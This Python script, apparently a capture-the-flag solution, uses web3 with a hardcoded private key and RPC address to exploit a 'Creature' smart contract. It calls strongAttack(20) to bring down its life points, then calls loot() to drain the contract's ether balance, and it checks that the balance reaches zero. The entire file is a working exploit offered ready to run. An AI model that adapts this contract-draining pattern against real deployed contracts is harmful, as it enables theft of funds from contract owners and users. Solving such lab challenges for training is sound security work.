from web3 import Web3

RPC_URL = "http://94.237.123.119:37206/rpc"
PRIVATE_KEY = "0x34ec0032473a17d04b07c803fa13d3bd98b3c39d7bf36764098ea89bfb0e54f5"
TARGET_ADDRESS = "0x3D5a7E75BcDc45BE9F77463Ff333b732D537eCc5"

CREATURE_ABI = [
    {
        "inputs": [],
        "name": "lifePoints",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"name": "_damage", "type": "uint256"}],
        "name": "strongAttack",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "loot",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    
    if not w3.is_connected():
        print("Failed to connect to RPC!")
        return
    
    print("Connected to RPC")
    
    code = w3.eth.get_code(TARGET_ADDRESS)
    if code == b'' or code == '0x':
        print(f"Contract not found at {TARGET_ADDRESS}")
        print("The instance might have expired. Spawn a new one and update the addresses.")
        return
    
    account = w3.eth.account.from_key(PRIVATE_KEY)
    creature = w3.eth.contract(address=TARGET_ADDRESS, abi=CREATURE_ABI)
    
    life_points = creature.functions.lifePoints().call()
    balance = w3.eth.get_balance(TARGET_ADDRESS)
    print(f"Life Points: {life_points}")
    print(f"Balance: {balance} wei")
    
    attack_tx = creature.functions.strongAttack(20).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_attack = account.sign_transaction(attack_tx)
    attack_hash = w3.eth.send_raw_transaction(signed_attack.raw_transaction)
    attack_receipt = w3.eth.wait_for_transaction_receipt(attack_hash)
    
    if attack_receipt['status'] != 1:
        print("Attack failed!")
        return
    
    print(f"Attack tx: {attack_hash.hex()}")
    
    life_points = creature.functions.lifePoints().call()
    print(f"Life Points now: {life_points}")
    
    loot_tx = creature.functions.loot().build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_loot = account.sign_transaction(loot_tx)
    loot_hash = w3.eth.send_raw_transaction(signed_loot.raw_transaction)
    loot_receipt = w3.eth.wait_for_transaction_receipt(loot_hash)
    
    if loot_receipt['status'] != 1:
        print("Loot failed!")
        return
    
    print(f"Loot tx: {loot_hash.hex()}")
    
    final_balance = w3.eth.get_balance(TARGET_ADDRESS)
    print(f"Final Balance: {final_balance} wei")
    
    if final_balance == 0:
        print("Done!")
    else:
        print("Something went wrong")
   
if __name__ == "__main__":
    main()
